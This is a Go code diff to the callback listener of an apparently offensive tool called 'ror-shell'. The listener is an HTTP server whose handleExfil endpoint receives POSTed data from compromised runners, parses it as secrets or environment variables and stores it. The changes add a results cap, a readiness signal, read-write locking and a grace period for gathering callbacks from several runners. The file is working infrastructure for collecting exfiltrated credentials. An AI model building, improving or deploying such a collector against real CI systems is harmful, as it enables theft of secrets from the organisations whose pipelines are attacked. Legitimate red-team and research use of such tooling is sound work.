@@ -14,6 +14,10 @@ import (
 	"time"
 )
 
+const maxListenerResults = 100
+
+const listenerGracePeriod = 5 * time.Second
+
 // CallbackResult holds the result of a single received callback.
 type CallbackResult struct {
 	Addr    string            `json:"addr"`
@@ -27,8 +31,9 @@ type Listener struct {
 	srv     *http.Server
 	addr    string
 	results []*CallbackResult
-	mu      sync.Mutex
+	mu      sync.RWMutex
 	out     io.Writer
+	ready   chan struct{}
 }
 
 // NewListener creates a new ror-shell listener.
@@ -37,14 +42,20 @@ func NewListener(listenAddr string, out io.Writer) *Listener {
 		addr:    listenAddr,
 		out:     out,
 		results: make([]*CallbackResult, 0),
+		ready:   make(chan struct{}),
 	}
 }
 
 // Addr returns the actual listen address after the server starts.
 func (l *Listener) Addr() string {
-	l.mu.Lock()
-	defer l.mu.Unlock()
+	l.mu.RLock()
+	defer l.mu.RUnlock()
 	return l.addr
+}
+
+// Ready returns a channel that is closed when the listener is bound and serving.
+func (l *Listener) Ready() <-chan struct{} {
+	return l.ready
 }
 
 // Run starts the HTTP server and blocks until context is cancelled.
@@ -71,18 +82,20 @@ func (l *Listener) Run(ctx context.Context) error {
 		return fmt.Errorf("listen %s: %w", l.addr, err)
 	}
 
-	// Update addr with the actual address (resolves port 0, IPv6 brackets, etc.)
 	l.mu.Lock()
 	l.addr = ln.Addr().String()
 	l.mu.Unlock()
 
 	fmt.Fprintf(l.out, "[ror-listener] listening on %s\n", l.addr)
 
-	// Shutdown on context cancellation — context.Background is intentional:
-	// ctx is already Done when this fires, so a fresh context is needed for
-	// the shutdown deadline.
+	close(l.ready)
+
+	// Local cancel so the shutdown-watcher goroutine exits when Serve returns.
+	localCtx, localCancel := context.WithCancel(ctx)
+	defer localCancel()
+
 	go func() { //nolint:gosec // G118: context.Background is intentional — parent ctx is already Done when this fires
-		<-ctx.Done()
+		<-localCtx.Done()
 		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 		defer cancel()
 		_ = srv.Shutdown(shutCtx)
@@ -96,22 +109,25 @@ func (l *Listener) Run(ctx context.Context) error {
 
 // Stop gracefully shuts down the listener.
 func (l *Listener) Stop(ctx context.Context) error {
-	l.mu.Lock()
+	l.mu.RLock()
 	srv := l.srv
-	l.mu.Unlock()
+	l.mu.RUnlock()
 	if srv == nil {
 		return nil
 	}
 	return srv.Shutdown(ctx)
 }
 
-// WaitFor blocks until the context is done or until data is received.
-// Returns all collected results.
+// WaitFor blocks until the context is done, the timeout expires, or data is
+// received. After the first callback arrives, a grace period allows additional
+// multi-runner callbacks to accumulate before returning.
 func (l *Listener) WaitFor(ctx context.Context, timeout time.Duration) ([]*CallbackResult, error) {
 	timer := time.NewTimer(timeout)
 	defer timer.Stop()
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
+
+	var graceDeadline time.Time
 
 	for {
 		select {
@@ -120,20 +136,26 @@ func (l *Listener) WaitFor(ctx context.Context, timeout time.Duration) ([]*Callb
 		case <-timer.C:
 			return l.getResults(), nil
 		case <-ticker.C:
-			l.mu.Lock()
-			if len(l.results) > 0 {
-				l.mu.Unlock()
+			l.mu.RLock()
+			n := len(l.results)
+			l.mu.RUnlock()
+
+			if n > 0 && graceDeadline.IsZero() {
+				graceDeadline = time.Now().Add(listenerGracePeriod)
+				fmt.Fprintf(l.out, "[ror-listener] first callback received, waiting %s for additional runners...\n", listenerGracePeriod)
+			}
+
+			if !graceDeadline.IsZero() && time.Now().After(graceDeadline) {
 				return l.getResults(), nil
 			}
-			l.mu.Unlock()
 		}
 	}
 }
 
 // getResults returns a copy of collected results.
 func (l *Listener) getResults() []*CallbackResult {
-	l.mu.Lock()
-	defer l.mu.Unlock()
+	l.mu.RLock()
+	defer l.mu.RUnlock()
 	cp := make([]*CallbackResult, len(l.results))
 	copy(cp, l.results)
 	return cp
@@ -143,6 +165,14 @@ func (l *Listener) getResults() []*CallbackResult {
 func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	l.mu.RLock()
+	count := len(l.results)
+	l.mu.RUnlock()
+	if count >= maxListenerResults {
+		http.Error(w, "result limit reached", http.StatusTooManyRequests)
 		return
 	}
 
@@ -172,7 +202,6 @@ func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
 			result.Secrets = secrets
 			result.Raw = string(body)
 		} else {
-			// Store raw as-is, try parsing as env vars anyway
 			result.Raw = string(body)
 			result.Secrets = parseEnvVars(string(body))
 		}
@@ -180,19 +209,19 @@ func (l *Listener) handleExfil(w http.ResponseWriter, r *http.Request) {
 
 	l.mu.Lock()
 	l.results = append(l.results, result)
-	count := len(l.results)
+	n := len(l.results)
 	l.mu.Unlock()
 
-	fmt.Fprintf(w, `{"status":"ok","received":%d}`+"\n", count)
+	fmt.Fprintf(w, `{"status":"ok","received":%d}`+"\n", n)
 }
 
 // handleHealth returns a simple health check response.
 func (l *Listener) handleHealth(w http.ResponseWriter, r *http.Request) {
-	l.mu.Lock()
+	l.mu.RLock()
 	count := len(l.results)
-	l.mu.Unlock()
+	l.mu.RUnlock()
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]any{
+	_ = json.NewEncoder(w).Encode(map[string]any{
 		"status":    "ok",
 		"results":   count,
 		"listening": true,
